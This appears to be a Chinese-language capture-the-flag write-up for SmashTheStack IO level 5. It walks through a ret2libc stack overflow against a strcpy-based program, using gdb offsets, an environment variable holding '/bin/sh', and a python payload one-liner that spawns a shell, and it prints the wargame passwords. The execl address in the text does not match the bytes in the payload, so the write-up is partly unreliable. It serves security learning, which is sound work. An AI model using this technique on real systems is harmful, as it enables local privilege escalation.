title: SmashTheStack IO level5
date: 2015-05-30 15:20:56
tags: 
- 缓冲区溢出
- Smash the Stack
categories: Smash the Stack
---
密码：LOoCy5PbKi63qXTh
<!-- more -->
# I、源代码
## ① 源代码
```
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv) {

    char buf[128];

    if(argc < 2) return 1;

    strcpy(buf, argv[1]);

    printf("%s\n", buf);

    return 0;
}
```
## ② 执行结果
![](https://ww4.sinaimg.cn/large/005CA6ZCjw1esmcb5wlznj30k201lq34.jpg)
# II、相关知识
 - 最基本的缓冲区溢出 level3就是基本缓冲区溢出例子，相信大家都了解了
 - [ret2lib](http://www.ibm.com/developerworks/cn/linux/1402_liumei_rilattack/)        原理有点长，我就不赘述了，大家可以参考我给的链接，也可以自己找原理

# III、找漏洞
## ① 思路
观察前几关的程序，需要构造输入的，最终的目的是执行execl("/bin/sh")
所以我首先想到的是，构造输入，修改main返回地址，让其指向库函数execl()起始地址，为了让execl正常返回，exit()地址入栈，然后参数"/bin/sh"入栈
栈结果如图：
![](https://ww2.sinaimg.cn/large/005CA6ZCjw1esmcbnj1jlj30oe0esac4.jpg)
## ② 引入环境变量
不存在值为"/bin/sh"的环境变量，首先引入环境变量BIN_SH（名字自拟），在同一个shell下，地址不变
![](https://ww4.sinaimg.cn/large/005CA6ZCjw1esmcczmmznj30k5021aag.jpg)
## ③ gdb调试
查看buf，ret地址,计算两者的差距
![](https://ww3.sinaimg.cn/large/005CA6ZCjw1esmcc9q14yj30k30bmgom.jpg)
![](https://ww2.sinaimg.cn/large/005CA6ZCjw1esmcci3a7vj30k309mafx.jpg)

buf：0xbffffbb0，ret：0xbffffc3c，两者相差 0x8c
因此<font color="red">输入格式：</font> "A"*0x8c + execl()起始地址 + exit()起始地址 + "/bin/sh"起始地址
## ④ 查看execl()、exit()、"/bin/sh"地址
在调试过程中可以p system     p exit 就可以查看了
环境变量BIN_SH在栈的下面，x/1000s 0xbffffbb0  可以打印出从0xbffffbb0开始的1000个字符（具体单位我也不清楚，大家自己百度），一直向下查看就可以找到BIN_SH了
![](https://ww1.sinaimg.cn/large/005CA6ZCjw1esmccofiyfj30k307mwh3.jpg)
![](https://ww3.sinaimg.cn/large/005CA6ZCgw1esmcdday4nj30k30c375r.jpg)

execl  : 0xb7f0f3f0
exit   : 0xb7e9d270
BIN_SH=/bin/sh : 0xbfffff6f
/bin/sh : 0xbfffff76

## ⑤ 校正"/bin/sh"地址
现在来验证下BIN_SH的地址是否正确
![](https://ww3.sinaimg.cn/large/005CA6ZCgw1esmcdvn3mzj30k302jmyt.jpg)
这个是调用execl()函数时，参数出错提示，说明execl地址正确
根据我的血泪史，一般函数地址这样查找都没有错，环境变量的地址一般不正确
经过我多次测试，/bin/sh : 0xbfffff70
<font color="red">PS：</font>我的校正方法
在/tmp 目录下新建一个自己的文件夹 star
进入 star 文件夹  ：cd star
想办法生成core文件，调试时，加上core文件，gdb ./level05 core -q  ，然后查看 BIN_SH 的地址
## ⑥ 获得密码
输入格式 "A"*0x8c + "0xb7f0f3f0" + "0xb7e9d270" + "0xbfffff70"

"$(python -c 'print "A"*0x8c + "\x30\x9c\xea\xb7" + "\x70\xd2\xe9\xb7" + "\x70\xff\xff\xbf" ')"
![](https://ww3.sinaimg.cn/large/005CA6ZCgw1esmce74oxcj30k203iabv.jpg)

OK！！！ 密码get：rXCikld0ex3EQsnI

